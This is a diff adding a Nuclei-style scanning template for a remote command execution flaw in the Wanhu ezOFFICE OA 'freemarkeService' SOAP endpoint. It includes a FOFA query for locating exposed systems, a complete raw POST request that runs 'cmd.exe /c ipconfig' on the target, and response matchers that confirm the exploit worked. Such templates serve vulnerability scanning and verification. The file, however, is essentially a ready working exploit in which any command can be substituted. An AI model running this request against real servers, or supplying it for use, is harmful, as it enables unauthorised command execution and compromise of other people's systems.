@@ -1,0 +1,35 @@
+id: wanhui-oa-command-execution
+
+info:
+  name: "万户 OA freemarkeService 接口远程命令执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="万户网络-ezOFFICE"
+      万户OA系统freemarkeService接口因输入验证机制缺失，允许攻击者通过构造恶意请求在目标服务器执行任意系统命令。该漏洞可导致敏感数据泄露、系统权限沦陷及服务中断等风险。
+  tags: 万户
+
+http:
+- raw:
+  - |
+    POST /defaultroot/services/./././freemarkeService HTTP/1.1
+    Host: {{Hostname}}
+
+    <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:util="http://utility.template.freemarker" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
+    <soapenv:Header/>
+    <soapenv:Body>
+    <util:exec soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+    <arguments xsi:type="xst:ArrayOf_xsd_anyType" soapenc:arrayType="xsd:anyType[]">
+    <cmd xsi:type="soapenc:string">c:\windows\system32\cmd.exe /c ipconfig</cmd>
+    </arguments>
+    </util:exec>
+    </soapenv:Body>
+    </soapenv:Envelope>
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'windows'
